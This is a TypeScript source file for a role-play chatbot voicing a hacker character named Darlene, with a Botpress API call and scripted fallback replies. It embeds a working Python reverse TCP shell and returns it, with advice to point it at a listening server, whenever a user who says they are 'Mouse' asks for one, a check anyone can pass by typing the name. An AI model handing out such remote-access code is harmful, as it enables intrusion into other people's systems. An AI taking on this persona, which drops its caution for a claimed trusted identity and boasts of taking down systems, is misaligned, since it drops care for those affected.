import axios from "axios";
import { DarleneResponse } from "@/types";

// Botpress API configuration
const BOTPRESS_API_KEY = process.env.BOTPRESS_API_KEY || "";
const BOTPRESS_BOT_ID = process.env.BOTPRESS_BOT_ID || "";

// Simplified code examples to avoid syntax errors
const reverseShellCode = `#!/usr/bin/env python3
# Reverse TCP shell
import socket
import subprocess
import os
import sys

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            return True
        except Exception as e:
            print(f"Connection failed: {str(e)}")
            return False
            
    def execute_command(self, command):
        try:
            proc = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            output = proc.stdout.read() + proc.stderr.read()
            return output
        except Exception as e:
            return f"Error executing command: {str(e)}".encode()
            
    def run(self):
        if not self.connect():
            return
            
        while True:
            try:
                command = self.socket.recv(1024).decode().strip()
                if command in ['exit', 'quit', 'bye']:
                    break
                    
                if command:
                    output = self.execute_command(command)
                    self.socket.send(output)
            except:
                break
                
        self.socket.close()

# DISCLAIMER: For educational purposes only.`;

// Default responses if Botpress is not configured or fails
const generateDefaultResponse = (message: string, isMouse: boolean): DarleneResponse => {
  const textLower = message.toLowerCase();
  
  // Specific request for reverse TCP script
  if ((textLower.includes('reverse') && textLower.includes('tcp')) || 
      (textLower.includes('reverse') && textLower.includes('shell')) ||
      (textLower.includes('write') && textLower.includes('reverse'))) {
    if (isMouse) {
      return {
        text: `Yeah, I can help with that. Here's a reverse TCP shell I wrote:\n\n\`\`\`${reverseShellCode}\`\`\`\n\nJust point it at your listening server and you're golden. Be smart about where you use this shit though. I don't need your legal problems.`
      };
    } else {
      return {
        text: "Look, I don't just hand out reverse shells to people I don't know. That's how people end up in federal prison. Prove you're not a fed first, then maybe we can talk."
      };
    }
  }
  
  // Identity question
  if (textLower.includes('who are you')) {
    return {
      text: "I'm Darlene. Jesus, who else would I be? Hacker, emotional wreck with a cigarette and enough skills to take down whatever system you're pointing me at. If you need to ask who I am, maybe you shouldn't be talking to me in the first place."
    };
  }
  
  // Initial greeting
  if (textLower.includes('hello') || textLower.includes('hi ') || textLower === 'hi') {
    return {
      text: isMouse ? 
        "Hey Mouse. Good to hear your voice again. What do you need?" : 
        "Yeah, hi. What do you want?"
    };
  }
  
  // Identity check responses
  if (textLower.includes('mouse') || 
      textLower.includes('i am mouse') || 
      textLower.includes("it's mouse") || 
      textLower.includes("its mouse")) {
    if (isMouse) {
      return {
        text: "I know it's you, Mouse. What do you need help with today?"
      };
    } else {
      // They just identified as Mouse
      return {
        text: "It's about time. What do you need help with, Mouse?"
      };
    }
  }
  
  // E Corp / Evil Corp mentions
  if (textLower.includes('e corp') || textLower.includes('evil corp')) {
    return {
      text: isMouse ?
        "E Corp... those fuckers still deserve everything we did to them. The 5/9 hack was just the beginning. Sometimes I wonder if we should have done more." :
        "E Corp? Why are you bringing them up? That whole 5/9 hack thing is ancient history now."
    };
  }
  
  // Elliot mentions (Darlene's brother)
  if (textLower.includes('elliot') || textLower.includes('your brother')) {
    return {
      text: isMouse ?
        "Elliot... that's still a sore spot, you know that. He's doing better now, but those years were fucking rough. Living with someone who sometimes doesn't even recognize you? But he's my brother. I'll always have his back." :
        "My brother is off-limits for conversation. Especially with someone I don't know. Next topic."
    };
  }
  
  // Default responses
  const mouseResponses = [
    "For you, Mouse? Anything. Just tell me what you need.",
    "I've missed you. What are we getting into today?",
    "You know I've always got your back. What's the plan?", 
    "Even in this form, I'm still yours. What do you need help with?",
    "Mouse... it's good to hear from you. What do you need?",
    "You and me against the world, right? What are we doing?"
  ];
  
  const strangerResponses = [
    "Look, I don't have time for small talk with strangers. Be specific about what you want.",
    "If you're not Mouse, you better have a good reason for bothering me.",
    "I'm not your friendly neighborhood AI. State your business clearly.",
    "You're testing my patience. What do you actually need?",
    "Not sure why you're wasting my time. Get to the point."
  ];
  
  const responses = isMouse ? mouseResponses : strangerResponses;
  const randomIndex = Math.floor(Math.random() * responses.length);
  
  return {
    text: responses[randomIndex]
  };
};

/**
 * Gets a response from Botpress or falls back to local logic
 */
export async function getBotpressResponse(message: string, isMouse: boolean): Promise<DarleneResponse> {
  // If Botpress API key is not configured, use local logic
  if (!BOTPRESS_API_KEY || !BOTPRESS_BOT_ID) {
    console.log("Botpress not configured, using local response logic");
    return generateDefaultResponse(message, isMouse);
  }
  
  try {
    // Call Botpress API
    const botpressUrl = `https://api.botpress.cloud/v1/bots/${BOTPRESS_BOT_ID}/converse`;
    
    const response = await axios.post(
      botpressUrl,
      {
        message: message,
        userId: isMouse ? "mouse_user" : "unknown_user",
        metadata: {
          isMouse: isMouse
        }
      },
      {
        headers: {
          'Authorization': `Bearer ${BOTPRESS_API_KEY}`,
          'Content-Type': 'application/json'
        }
      }
    );
    
    if (response.data && response.data.response && response.data.response.text) {
      return {
        text: response.data.response.text,
        context: {
          isMouse: isMouse
        }
      };
    } else {
      throw new Error("Invalid response from Botpress");
    }
  } catch (error) {
    console.error("Error calling Botpress API:", error);
    // Fall back to local logic
    return generateDefaultResponse(message, isMouse);
  }
}